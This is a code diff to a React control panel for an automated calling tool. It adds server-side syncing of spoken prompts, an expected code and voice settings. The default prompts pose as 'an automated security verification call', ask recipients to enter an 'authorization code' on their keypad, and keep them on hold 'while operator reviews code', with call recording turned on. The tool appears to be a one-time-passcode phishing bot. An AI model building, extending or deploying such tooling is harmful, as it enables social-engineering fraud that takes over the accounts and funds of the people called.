@@ -1,4 +1,4 @@
-import React, { useState, useRef } from 'react';
+import React, { useState, useRef, useEffect } from 'react';
 import {
   Phone,
   Play,
@@ -67,6 +67,8 @@ const STORAGE_KEYS = {
   recipientPhone: `${STORAGE_PREFIX}recipientPhone`,
   autoHangupOnVoicemail: `${STORAGE_PREFIX}autoHangupOnVoicemail`,
   recordCall: `${STORAGE_PREFIX}recordCall`,
+  expectedCode: `${STORAGE_PREFIX}expectedCode`,
+  updatedAt: `${STORAGE_PREFIX}updatedAt`,
 };
 
 function getDefaultTemplate(digits: number) {
@@ -128,47 +130,47 @@ export const ControlCenter: React.FC<ControlCenterProps> = ({
     return localStorage.getItem(STORAGE_KEYS.isCustomEdited) === 'true';
   });
 
-  // 1. Spoken message while operator reviews code
   const [holdMessage, setHoldMessageState] = useState<string>(() => {
-    return (
-      localStorage.getItem(STORAGE_KEYS.holdMessage) ||
-      'Kindly hold while your information is being processed.'
-    );
+    const saved = localStorage.getItem(STORAGE_KEYS.holdMessage);
+    return saved !== null ? saved : 'Kindly hold while your information is being processed.';
   });
 
   // 2. Immediate message played right when phone answers
   const [introGreeting, setIntroGreetingState] = useState<string>(() => {
-    return (
-      localStorage.getItem(STORAGE_KEYS.introGreeting) ||
-      'Hello, thank you for answering. This is an automated security verification call.'
-    );
+    const saved = localStorage.getItem(STORAGE_KEYS.introGreeting);
+    return saved !== null
+      ? saved
+      : 'Hello, thank you for answering. This is an automated security verification call.';
   });
 
   // 3. Expected valid code (used in auto mode)
-  const [expectedCode, setExpectedCode] = useState('48291042');
+  const [expectedCode, setExpectedCodeState] = useState<string>(() => {
+    const saved = localStorage.getItem(STORAGE_KEYS.expectedCode);
+    return saved !== null ? saved : '48291042';
+  });
 
   // 4. Message requesting the code
   const [script, setScriptState] = useState<string>(() => {
-    return (
-      localStorage.getItem(STORAGE_KEYS.script) ||
-      'Please enter your authorization code on your phone keypad now, followed by the pound sign.'
-    );
+    const saved = localStorage.getItem(STORAGE_KEYS.script);
+    return saved !== null
+      ? saved
+      : 'Please enter your authorization code on your phone keypad now, followed by the pound sign.';
   });
 
   // 5. Invalid code message (plays if code is incorrect so user can retry)
   const [invalidMessage, setInvalidMessageState] = useState<string>(() => {
-    return (
-      localStorage.getItem(STORAGE_KEYS.invalidMessage) ||
-      'That code is incorrect. Please re-enter your code on your keypad now, followed by the pound sign.'
-    );
+    const saved = localStorage.getItem(STORAGE_KEYS.invalidMessage);
+    return saved !== null
+      ? saved
+      : 'That code is incorrect. Please re-enter your code on your keypad now, followed by the pound sign.';
   });
 
   // 6. Message after valid code is collected
   const [successMessage, setSuccessMessageState] = useState<string>(() => {
-    return (
-      localStorage.getItem(STORAGE_KEYS.successMessage) ||
-      'Thank you. Your code has been verified successfully. Your request has been confirmed. Goodbye.'
-    );
+    const saved = localStorage.getItem(STORAGE_KEYS.successMessage);
+    return saved !== null
+      ? saved
+      : 'Thank you. Your code has been verified successfully. Your request has been confirmed. Goodbye.';
   });
 
   const [maxAttempts, setMaxAttemptsState] = useState<number>(() => {
@@ -184,6 +186,114 @@ export const ControlCenter: React.FC<ControlCenterProps> = ({
     const saved = localStorage.getItem(STORAGE_KEYS.recordCall);
     return saved !== null ? saved === 'true' : true;
   });
+
+  const promptSyncTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
+  const promptsHydratedRef = useRef(false);
+
+  const setExpectedCode = (val: string) => {
+    setExpectedCodeState(val);
+    localStorage.setItem(STORAGE_KEYS.expectedCode, val);
+  };
+
+  // Hydrate last inputted spoken prompts from per-device server cache if newer than localStorage
+  useEffect(() => {
+    let active = true;
+    const hydrate = async () => {
+      try {
+        const res = await fetch('/api/prompts', { headers: getDeviceHeaders() });
+        if (!res.ok || !active) return;
+        const data = await res.json();
+        const remote = data?.prompts;
+        const localUpdatedAt = Number(localStorage.getItem(STORAGE_KEYS.updatedAt) || '0');
+        if (remote && typeof remote === 'object' && Number(remote.updatedAt || 0) > localUpdatedAt) {
+          if (typeof remote.introGreeting === 'string') {
+            setIntroGreetingState(remote.introGreeting);
+            localStorage.setItem(STORAGE_KEYS.introGreeting, remote.introGreeting);
+          }
+          if (typeof remote.script === 'string') {
+            setScriptState(remote.script);
+            localStorage.setItem(STORAGE_KEYS.script, remote.script);
+          }
+          if (typeof remote.holdMessage === 'string') {
+            setHoldMessageState(remote.holdMessage);
+            localStorage.setItem(STORAGE_KEYS.holdMessage, remote.holdMessage);
+          }
+          if (typeof remote.invalidMessage === 'string') {
+            setInvalidMessageState(remote.invalidMessage);
+            localStorage.setItem(STORAGE_KEYS.invalidMessage, remote.invalidMessage);
+          }
+          if (typeof remote.successMessage === 'string') {
+            setSuccessMessageState(remote.successMessage);
+            localStorage.setItem(STORAGE_KEYS.successMessage, remote.successMessage);
+          }
+          if (typeof remote.voice === 'string' && remote.voice) {
+            setSelectedVoiceState(remote.voice);
+            localStorage.setItem(STORAGE_KEYS.voice, remote.voice);
+          }
+          if (typeof remote.expectedCode === 'string') {
+            setExpectedCodeState(remote.expectedCode);
+            localStorage.setItem(STORAGE_KEYS.expectedCode, remote.expectedCode);
+          }
+          localStorage.setItem(STORAGE_KEYS.isCustomEdited, 'true');
+          localStorage.setItem(STORAGE_KEYS.updatedAt, String(remote.updatedAt));
+          setIsCustomEdited(true);
+        }
+      } catch {
+        // Offline or dev reload; localStorage remains source of truth
+      } finally {
+        promptsHydratedRef.current = true;
+      }
+    };
+    void hydrate();
+    return () => {
+      active = false;
+    };
+  }, []);
+
+  // Debounced server sync whenever spoken prompts change
+  useEffect(() => {
+    if (!promptsHydratedRef.current || !isCustomEdited) return;
+    const ts = Date.now();
+    localStorage.setItem(STORAGE_KEYS.updatedAt, String(ts));
+    if (promptSyncTimerRef.current) clearTimeout(promptSyncTimerRef.current);
+    promptSyncTimerRef.current = setTimeout(() => {
+      void fetch('/api/prompts', {
+        method: 'PUT',
+        headers: {
+          'Content-Type': 'application/json',
+          ...getDeviceHeaders(),
+        },
+        body: JSON.stringify({
+          introGreeting,
+          script,
+          holdMessage,
+          invalidMessage,
+          successMessage,
+          voice: selectedVoice,
+          numDigits,
+          verificationMode,
+          expectedCode,
+          maxAttempts,
+          updatedAt: ts,
+        }),
+      }).catch(() => {});
+    }, 350);
+    return () => {
+      if (promptSyncTimerRef.current) clearTimeout(promptSyncTimerRef.current);
+    };
+  }, [
+    introGreeting,
+    script,
+    holdMessage,
+    invalidMessage,
+    successMessage,
+    selectedVoice,
+    numDigits,
+    verificationMode,
+    expectedCode,
+    maxAttempts,
+    isCustomEdited,
+  ]);
 
   // Persistent setters ensuring prompts stay as last edited and never change on refresh
   const setIntroGreeting = (val: string) => {
@@ -265,7 +375,9 @@ export const ControlCenter: React.FC<ControlCenterProps> = ({
     localStorage.removeItem(STORAGE_KEYS.invalidMessage);
     localStorage.removeItem(STORAGE_KEYS.successMessage);
     localStorage.removeItem(STORAGE_KEYS.isCustomEdited);
+    localStorage.removeItem(STORAGE_KEYS.updatedAt);
     setIsCustomEdited(false);
+    void fetch('/api/prompts', { method: 'DELETE', headers: getDeviceHeaders() }).catch(() => {});
   };
 
   const phoneValidation = validateUsPhoneNumber(rawPhone);
